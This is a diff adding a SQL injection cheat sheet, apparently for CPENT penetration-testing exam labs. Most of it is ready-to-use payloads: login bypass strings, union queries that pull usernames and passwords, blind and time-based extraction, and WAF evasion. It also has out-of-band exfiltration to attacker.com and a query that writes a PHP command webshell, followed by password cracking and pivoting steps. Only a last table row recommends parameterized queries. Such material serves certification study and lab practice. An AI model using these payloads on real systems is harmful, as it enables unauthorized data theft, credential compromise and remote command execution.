@@ -1,0 +1,135 @@
+CPENT SQL Injection Cheat Sheet
+1️⃣ Identifying Vulnerable Parameters
+
+Test Inputs:
+
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+admin'--
+
+
+Tips:
+
+Test in URL parameters, form fields, cookies, headers (User-Agent, X-Forwarded-For)
+
+Look for error messages or unusual page behavior
+
+2️⃣ Error-Based SQLi
+
+Purpose: Enumerate DB info using visible errors.
+
+' ORDER BY 1--        -- Find columns
+' UNION SELECT null,null--   -- Align columns
+' UNION SELECT 1,@@version-- -- DB version
+' UNION SELECT 1,database()-- -- DB name
+' UNION SELECT 1,user()--     -- Current DB user
+
+
+Notes: Use null fillers for non-injectable columns.
+
+3️⃣ Union-Based SQLi
+
+Steps:
+
+Find number of columns: ' ORDER BY X--
+
+Identify injectable column: ' UNION SELECT 1,'a',3--
+
+Extract tables:
+
+' UNION SELECT 1,table_name FROM information_schema.tables--
+
+
+Extract columns:
+
+' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+
+
+Extract sensitive data:
+
+' UNION SELECT 1,concat(username,':',password) FROM users--
+
+4️⃣ Boolean Blind SQLi
+
+Check True/False conditions:
+
+' AND 1=1--   -- True
+' AND 1=2--   -- False
+' AND substring(database(),1,1)='a'--  -- Extract DB name char by char
+
+5️⃣ Time-Based Blind SQLi
+
+Use when output is blocked:
+
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(SUBSTRING(USER(),1,1)='r',SLEEP(5),0)--
+
+
+Tips: Automate with Burp Intruder for faster enumeration.
+
+6️⃣ Authentication Bypass
+
+Bypass login forms:
+
+admin' OR '1'='1'--
+' OR '1'='1' LIMIT 1--
+
+
+Exam Tip: Access admin-only areas without credentials.
+
+7️⃣ WAF / Filter Bypass
+
+Techniques:
+
+UNI/**/ON SEL/**/ECT 1,2--      -- Inline comments
+UnIoN SeLeCt 1,2--              -- Case variations
+%27 OR 1=1--                     -- URL-encoding
+
+8️⃣ Out-of-Band (OOB) SQLi
+
+Purpose: Exfiltrate data when direct output blocked.
+
+SELECT load_file('//attacker.com/file.txt')--  -- MySQL
+exec master..xp_dirtree '\\attacker.com\share'  -- MSSQL
+
+
+Tip: Use Burp Collaborator to capture OOB requests.
+
+9️⃣ Post-Exploitation
+
+Write Webshell (MySQL Example):
+
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+
+
+Next Steps:
+
+Test: http://lab.local/shell.php?cmd=whoami
+
+Dump users → crack passwords → pivot
+
+Use for lateral movement in CPENT labs
+
+🔟 Blind Enumeration Sequence (CPENT Exam Style)
+
+Identify injectable parameter
+
+Confirm type (error-based or blind)
+
+Determine number of columns (ORDER BY)
+
+Extract DB info (@@version, database(), user())
+
+Extract tables & columns (information_schema)
+
+Dump sensitive info (users, passwords)
+
+Pivot → RCE or OOB if allowed
+
+11️⃣ Reporting Template (CPENT / Real-World)
+Field	Example
+Vulnerable Parameter	id=
+Payload	' UNION SELECT 1,user()--
+Impact	Full database exposure → credential theft
+Recommendation	Use parameterized queries, validate input, tune WAF
